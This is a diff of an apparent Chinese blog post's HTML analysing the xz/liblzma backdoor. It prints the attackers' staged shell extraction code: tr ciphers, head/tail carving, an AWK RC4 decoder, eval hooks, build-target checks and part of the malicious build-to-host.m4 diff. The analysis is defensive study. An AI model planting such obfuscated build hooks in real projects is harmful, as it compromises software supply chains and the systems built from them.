-<p>在下一步中 <code>tail -c +31233</code> 数据的初始部分被丢弃（剧透：它隐藏了二进制后门，该后门将在下一阶段中提取，因此现在不需要）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 （差异是因为 tail -c +N 表示“从字节 N 开始输出”而不是“忽略前 N 个字节”）</p>
+<p>接下去执行 <code>tail -c +31233 </code>忽略数据的初始部分（<code>tail -c +N</code> 表示“从字节 N 开始输出”，注：初始部分隐藏了二进制后门，会将在下一阶段中提取）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 。</p>
 </li>
 <li>
 <p>第5步执行 tr 命令，用作简单的替换密码，密钥（字节值映射）在 5.6.0 和 5.6.1 中不同，两种情况下，都有 6 个范围映射到整个 0 - 255（即八进制 377）范围。</p>
@@ -379,7 +429,7 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl">5.6.1: tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span>
 </span></span></code></pre></div></li>
 <li>
-<p>在最后一步中，解密的数据被解压缩（<code>xz -F raw --lzma1 -dc</code>），并且立即执行生成的阶段 2。</p>
+<p>在最后一步中，解密的数据被解压缩（<code>xz -F raw --lzma1 -dc</code>），并且立即执行Stage 2。</p>
 </li>
 </ol>
 <p>5.6.0 解压结果部分：</p>
@@ -598,7 +648,7 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$DHLd</span>
 </span></span></code></pre></div><h3 id="stage-2">Stage 2</h3>
-<p>第 2 阶段是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1"target="_blank" rel="external nofollow noopener noreferrer">fected.txt</a> 文件。这个 bash 脚本中发生了很多事情，因为这是实际编译过程修改发生的地方。</p>
+<p>Stage 2是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1"target="_blank" rel="external nofollow noopener noreferrer">fected.txt</a> 文件。这个 bash 脚本中发生了很多事情，因为这是实际编译过程修改发生的地方。</p>
 <p>从混淆分析的角度来看，该脚本存在三个有趣的片段，其中两个仅出现在5.6.1版本中。</p>
 <h4 id="扩展-机制">扩展 机制</h4>
 <p>片段1</p>
@@ -638,17 +688,18 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span></code></pre></div><p>这两个片段几乎相同，所以可以一起处理它们。</p>
+<p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240407125802810.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240407125802810.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png 2x" sizes="auto" data-title="image-20240407125802810" data-alt="image-20240407125802810" width="1408" height="478" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <ol>
 <li>
 <p>首先，他们尝试在tests/files/目录中查找（grep -broaF）两个文件，其中包含以下字节（签名）</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Fragment 1: <span class="s2">&#34;~!:_ W&#34;</span> and <span class="s2">&#34;|_!{ -&#34;</span>
 </span></span><span class="line"><span class="cl">Fragment 3: <span class="s2">&#34;jV!.^%&#34;</span> and <span class="s2">&#34;%.R.1Z&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 请注意，在这种情况下 grep 实际输出的格式如下：file_name:offset:signature。例如：</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 注：grep 实际输出格式如下：file_name:offset:signature。例如：</span>
 </span></span><span class="line"><span class="cl">$ grep -broaF <span class="s2">&#34;XYZ&#34;</span>
 </span></span><span class="line"><span class="cl">testfile:9:XYZ
 </span></span></code></pre></div></li>
 <li>
-<p>如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量保存作为 $end.</p>
+<p>如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end.</p>
 </li>
 <li>
 <p>一旦脚本有了 $start 和 $end 偏移量，它就会切出文件中具有第一个签名的部分 <code>cat $f1 | tail -c +${start} | head -c +${end}</code></p>
@@ -661,7 +712,32 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <pre tabindex="0"><code>eval `... | xz -F raw --lzma2 -dc`
 </code></pre></li>
 </ol>
-<p>请注意，在所调查的 TAR 存档（5.6.0 和 5.6.1）中都不存在任何带有任何签名的文件。整个事情基本上看起来像一个“扩展/修补”系统，允许添加未来的脚本以在第 2 阶段的上下文中运行，而无需修改原始的负载测试文件。这是有道理的，因为一遍又一遍地修改“坏”和“好”测试文件是非常可疑的。因此，计划似乎只是添加新的测试文件，这些文件将被拾取、破译和执行。</p>
+<p>事实上，在现有的5.6.0和5.6.1的TAR存档中都没发现任何带有签名的文件，看上去像是一个待使用的“扩展插件”系统，允许未来添加脚本以在该阶段的上下文中运行，而无需修改原始的负载文件。毕竟，不断地修改 bad 和 good 测试文件很可疑。</p>
+<h4 id="目标选择">目标选择</h4>
+<p>此脚本会检查各种条件，例如计算机的体系结构。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;^x86_64&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;linux-gnu</span>$<span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span><span class="p">;</span><span class="k">then</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>如果 amd64/x86_64 是构建的目标</p>
+</li>
+<li>
+<p>如果目标使用名称 <code>linux-gnu</code> （主要是检查是否使用了 glibc）</p>
+</li>
+</ul>
+<p>它还会检查正在使用的工具链：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$GCC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xyes&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$CC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xgcc&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LDv</span><span class="o">=</span><span class="nv">$LD</span><span class="s2">&#34; -v&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nv">$LDv</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -qs <span class="s1">&#39;GNU ld&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
+</span></span></code></pre></div><p>如果正在尝试复现构建 Debian 或 Red Hat 软件包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/debian/rules&#34;</span> <span class="o">||</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$RPM_ARCH</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;xx86_64&#34;</span><span class="p">;</span><span class="k">then</span>
+</span></span></code></pre></div><p>因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。</p>
+<p>其他系统目前可能容易受到攻击，但没有明确的证据。</p>
 <h4 id="后门提取">后门提取</h4>
 <p>正如 Andres 在原始电子邮件中指出的那样，在某些时候会提取 .o 文件并将其编织到编译/链接过程中。由以下代码负责</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
@@ -672,13 +748,13 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl">xz -dc <span class="nv">$top_srcdir</span>/tests/files/<span class="nv">$p</span> <span class="p">|</span> <span class="nb">eval</span> <span class="nv">$i</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C sed <span class="s2">&#34;s/\(.\)/\1\n/g&#34;</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C awk <span class="s1">&#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &#34;%c&#34;,(v+k)%m}&#39;</span> <span class="p">|</span> xz -dc --single-stream <span class="p">|</span> <span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
 </span></span></code></pre></div><p>版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。</p>
-<p>实际上某些步骤与Stage 1相同（它们的二进制payload驻留在“good”文件数据中先前被忽略的部分中）。</p>
+<p>实际上某些步骤与Stage 1相同（它的二进制 payload 在“good”文件数据中先前被忽略的部分中）。</p>
 <ol>
 <li>
-<p>第一步与Stage 1 中的步骤 2 相同，用xz解压 tests/files/good-large_compressed.lzma 文件</p>
+<p>与Stage 1 中的步骤 2 相同，用xz解压 tests/files/good-large_compressed.lzma 文件</p>
 </li>
 <li>
-<p>第二步又与Stage 1 中的步骤 3 相同——即“很多head”“函数”调用。</p>
+<p>与Stage 1 中的步骤 3 相同，即“很多 head 函数”调用。</p>
 </li>
 <li>
 <p>这有不同了。首先之前的输出被 sed 命令破坏了。<code>LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot;</code> 其作用实际上是在每个字节后面放置一个换行符（换行符本身除外）。因此，我们最终在输出中得到的是每行字节的情况（这里有很多混合“文本”和“二进制”文件）。这正是下一步所需要的。</p>
@@ -724,19 +800,22 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl"><span class="o">}</span>
 </span></span></code></pre></div></li>
 <li>
-<p>输入被解密后，这一步进行解压：<code>xz -dc --single-stream</code></p>
+<p>输入被解密后，这一步进行解压：<code>xz -dc --single-stream</code> ；</p>
 </li>
 <li>
-<p>然后使用head技巧截取从 N (0) 到 W (~86KB) 的字节，并保存为 liblzma_la-crc64-fast.o – 这是最终的二进制后门。</p>
+<p>然后使用head技巧截取从 N (0) 到 W (~86KB) 的字节，并保存为 liblzma_la-crc64-fast.o ，这是最终的二进制后门。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o
 </span></span></code></pre></div></li>
 </ol>
 <p>5.6.0 版本N为0，W为88792</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406215017407.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406215017407.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png 2x" sizes="auto" data-title="image-20240406215017407" data-alt="image-20240406215017407" width="2224" height="394" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="o二进制分析">.o二进制分析</h3>
-<p>关于.o二进制文件的分析，可以参考这篇文章：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</p>
-<p>逆向后的项目，基于xz 5.6.1版本，可见：https://github.com/smx-smx/xzre</p>
-<p>国内也有篇文章：https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg</p>
+<p>这块我不擅长，就不班门弄斧了。</p>
+<p>关于.o二进制文件的分析，可以参考<a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504"target="_blank" rel="external nofollow noopener noreferrer">这篇文章</a>，文中对二进制文件中很多函数功能都有相应的推测，可以进行参考。</p>
+<p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640-2466330.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640-2466330.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png 2x" sizes="auto" data-title="图片" data-alt="图片" width="1080" height="945" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640-20240407130620159.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640-20240407130620159.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png 2x" sizes="auto" data-title="图片" data-alt="图片" width="940" height="1297" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>逆向后的项目，基于xz 5.6.1版本，可见：https://github.com/smx-smx/xzre，该项目是基于xz 5.6.1版本。</p>
+<p>国内也有篇文章分析的很好：<a href="https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg"target="_blank" rel="external nofollow noopener noreferrer">XZ开源项目投毒事件深入解析</a></p>
 <p>该后门首先在 sshd 启动时替换 <code>crc32_resolve()</code> 和 <code>crc64_resolve</code>，然后试图从内存中解析符号表，并查找 <code>RSA_public_decrypt@....plt</code> 符号，并将其指向的地址替换为后门代码。</p>
 <p>在 SSH 登录认证时，sshd 会调用该符号，并在服务器上执行攻击代码。</p>
 <h3 id="后门设计分析">后门设计分析</h3>
@@ -753,99 +832,14 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <li>IFUNC 是 glibc 中允许间接函数调用的一种机制，用于执行 OpenSSH 身份验证例程的运行时挂钩/重定向。IFUNC 是一种通常用于合法事物的工具，但在这种情况下，它被用于此攻击路径。</li>
 </ul>
 <p>通常，上游发布的 tarball 与 GitHub 中自动生成的 tarball 不同。在这些修改后的 tarball 中，包含一个恶意版本 <code>build-to-host.m4</code> ，用于在构建过程中执行脚本。</p>
-<p>此脚本（至少在版本 5.6.0 和 5.6.1 中）检查各种条件，例如计算机的体系结构。以下是被解压缩的恶意脚本的片段 <code>build-to-host.m4</code> 及其作用的解释：</p>
-<blockquote>
-<pre tabindex="0"><code>if ! (echo &#34;$build&#34; | grep -Eq &#34;^x86_64&#34; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &#34;$build&#34; | grep -Eq &#34;linux-gnu$&#34; &gt; /dev/null 2&gt;&amp;1);then
-</code></pre></blockquote>
+<p>整起事件隐匿的很好，从用于存储payload的二进制测试文件，到文件内容雕刻、替换密码和 AWK 中实现的 RC4 变体，所有这些都只需使用标准命令行工具即可完成。</p>
+<p>所有这一切都在 3 个执行阶段中进行，并通过“扩展”系统实现面向未来的事物，而不必再次更改二进制测试文件。</p>
+<h3 id="payload-分析">payload 分析</h3>
+<p>如果上述后门条件得到满足，payload将运行并注入到源代码树中。以下是我所知道的主要内容：</p>
 <ul>
-<li>如果 amd64/x86_64 是构建的目标</li>
-<li>如果目标使用名称 <code>linux-gnu</code> （主要是检查是否使用了 glibc）</li>
-</ul>
-<p>它还会检查正在使用的工具链：</p>
-<blockquote>
-<pre tabindex="0"><code>  if test &#34;x$GCC&#34; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then
-  exit 0
-  fi
-  if test &#34;x$CC&#34; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then
-  exit 0
-  fi
-  LDv=$LD&#34; -v&#34;
-  if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;then
-  exit 0
-</code></pre></blockquote>
-<p>如果正在尝试复现构建 Debian 或 Red Hat 软件包：</p>
-<blockquote>
-<pre tabindex="0"><code>if test -f &#34;$srcdir/debian/rules&#34; || test &#34;x$RPM_ARCH&#34; = &#34;xx86_64&#34;;then
-</code></pre></blockquote>
-<p>因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。其他系统目前可能容易受到攻击，但我们不知道。</p>
-<p>整起事件隐匿的很好，从用于存储payload的二进制测试文件，到文件内容雕刻、替换密码和 AWK 中实现的 RC4 变体，所有这些都只需使用标准命令行工具即可完成。所有这一切都在 3 个执行阶段中进行，并通过“扩展”系统实现面向未来的事物，而不必再次更改二进制测试文件。</p>
-<h3 id="后门设计细节">后门设计细节</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ git diff m4/build-to-host.m4 ~/data/xz/xz-5.6.1/m4/build-to-host.m4
-</span></span><span class="line"><span class="cl">diff --git a/m4/build-to-host.m4 b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
-</span></span><span class="line"><span class="cl">index f928e9ab..d5ec3153 <span class="m">100644</span>
-</span></span><span class="line"><span class="cl">--- a/m4/build-to-host.m4
-</span></span><span class="line"><span class="cl">+++ b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
-</span></span><span class="line"><span class="cl">@@ -1,4 +1,4 @@
-</span></span><span class="line"><span class="cl">-# build-to-host.m4 serial <span class="m">3</span>
-</span></span><span class="line"><span class="cl">+# build-to-host.m4 serial <span class="m">30</span>
-</span></span><span class="line"><span class="cl"> dnl Copyright <span class="o">(</span>C<span class="o">)</span> 2023-2024 Free Software Foundation, Inc.
-</span></span><span class="line"><span class="cl"> dnl This file is free software<span class="p">;</span> the Free Software Foundation
-</span></span><span class="line"><span class="cl"> dnl gives unlimited permission to copy and/or distribute it,
-</span></span><span class="line"><span class="cl">@@ -37,6 +37,7 @@ AC_DEFUN<span class="o">([</span>gl_BUILD_TO_HOST<span class="o">]</span>,
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">   dnl Define somedir_c.
-</span></span><span class="line"><span class="cl">   gl_final_<span class="o">[</span><span class="nv">$1</span><span class="o">]=</span><span class="s2">&#34;</span>$<span class="s2">[</span><span class="nv">$1</span><span class="s2">]&#34;</span>
-</span></span><span class="line"><span class="cl">+  gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_prefix</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$gl_am_configmake</span> <span class="p">|</span> sed <span class="s2">&#34;s/.*\.//g&#34;</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">   dnl Translate it from build syntax to host syntax.
-</span></span><span class="line"><span class="cl">   <span class="k">case</span> <span class="s2">&#34;</span><span class="nv">$build_os</span><span class="s2">&#34;</span> in
-</span></span><span class="line"><span class="cl">     cygwin*<span class="o">)</span>
-</span></span><span class="line"><span class="cl">@@ -58,14 +59,40 @@ AC_DEFUN<span class="o">([</span>gl_BUILD_TO_HOST<span class="o">]</span>,
-</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;</span>$<span class="s2">[</span><span class="nv">$1</span><span class="s2">]_c_make&#34;</span> <span class="o">=</span> <span class="s1">&#39;\&#34;&#39;</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">gl_final_</span><span class="p">[</span><span class="nv">$1</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="s1">&#39;\&#34;&#39;</span><span class="p">;</span> <span class="k">then</span>
-</span></span><span class="line"><span class="cl">     <span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_c_make</span><span class="o">=</span><span class="s1">&#39;\&#34;$([$1])\&#34;&#39;</span>
-</span></span><span class="line"><span class="cl">   <span class="k">fi</span>
-</span></span><span class="line"><span class="cl">+  <span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$gl_am_configmake</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span><span class="p">;</span> <span class="k">then</span>
-</span></span><span class="line"><span class="cl">+    gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_config</span><span class="o">=</span><span class="s1">&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;</span>
-</span></span><span class="line"><span class="cl">+  <span class="k">else</span>
-</span></span><span class="line"><span class="cl">+    gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_config</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">+  <span class="k">fi</span>
-</span></span><span class="line"><span class="cl">+  _LT_TAGDECL<span class="o">([]</span>, <span class="o">[</span>gl_path_map<span class="o">]</span>, <span class="o">[</span>2<span class="o">])</span>dnl
-</span></span><span class="line"><span class="cl">+  _LT_TAGDECL<span class="o">([]</span>, <span class="o">[</span>gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span>_prefix<span class="o">]</span>, <span class="o">[</span>2<span class="o">])</span>dnl
-</span></span><span class="line"><span class="cl">+  _LT_TAGDECL<span class="o">([]</span>, <span class="o">[</span>gl_am_configmake<span class="o">]</span>, <span class="o">[</span>2<span class="o">])</span>dnl
-</span></span><span class="line"><span class="cl">+  _LT_TAGDECL<span class="o">([]</span>, <span class="o">[[</span><span class="nv">$1</span><span class="o">]</span>_c_make<span class="o">]</span>, <span class="o">[</span>2<span class="o">])</span>dnl
-</span></span><span class="line"><span class="cl">+  _LT_TAGDECL<span class="o">([]</span>, <span class="o">[</span>gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span>_config<span class="o">]</span>, <span class="o">[</span>2<span class="o">])</span>dnl
-</span></span><span class="line"><span class="cl">   AC_SUBST<span class="o">([</span><span class="nv">$1</span>_c_make<span class="o">])</span>
-</span></span><span class="line"><span class="cl">+
-</span></span><span class="line"><span class="cl">+  dnl If the host conversion code has been placed in <span class="nv">$gl_config_gt</span>,
-</span></span><span class="line"><span class="cl">+  dnl instead of duplicating it all over again into config.status,
-</span></span><span class="line"><span class="cl">+  dnl <span class="k">then</span> we will have config.status run <span class="nv">$gl_config_gt</span> later, so it
-</span></span><span class="line"><span class="cl">+  dnl needs to know what name is stored there:
-</span></span><span class="line"><span class="cl">+  AC_CONFIG_COMMANDS<span class="o">([</span>build-to-host<span class="o">]</span>, <span class="o">[</span><span class="nb">eval</span> <span class="nv">$gl_config_gt</span> <span class="p">|</span> <span class="nv">$SHELL</span> 2&gt;/dev/null<span class="o">]</span>, <span class="o">[</span><span class="nv">gl_config_gt</span><span class="o">=</span><span class="s2">&#34;eval \$gl_[</span><span class="nv">$1</span><span class="s2">]_config&#34;</span><span class="o">])</span>
-</span></span><span class="line"><span class="cl"> <span class="o">])</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"> dnl Some initializations <span class="k">for</span> gl_BUILD_TO_HOST.
-</span></span><span class="line"><span class="cl"> AC_DEFUN<span class="o">([</span>gl_BUILD_TO_HOST_INIT<span class="o">]</span>,
-</span></span><span class="line"><span class="cl"> <span class="o">[</span>
-</span></span><span class="line"><span class="cl">+  dnl Search <span class="k">for</span> Automake-defined pkg* macros, in the order
-</span></span><span class="line"><span class="cl">+  dnl listed in the Automake 1.10a+ documentation.
-</span></span><span class="line"><span class="cl">+  <span class="nv">gl_am_configmake</span><span class="o">=</span><span class="sb">`</span>grep -aErls <span class="s2">&#34;#{4}[[:alnum:]]{5}#{4}</span>$<span class="s2">&#34;</span> <span class="nv">$srcdir</span>/ 2&gt;/dev/null<span class="sb">`</span>
-</span></span><span class="line"><span class="cl">+  <span class="k">if</span> <span class="nb">test</span> -n <span class="s2">&#34;</span><span class="nv">$gl_am_configmake</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
-</span></span><span class="line"><span class="cl">+    <span class="nv">HAVE_PKG_CONFIGMAKE</span><span class="o">=</span><span class="m">1</span>
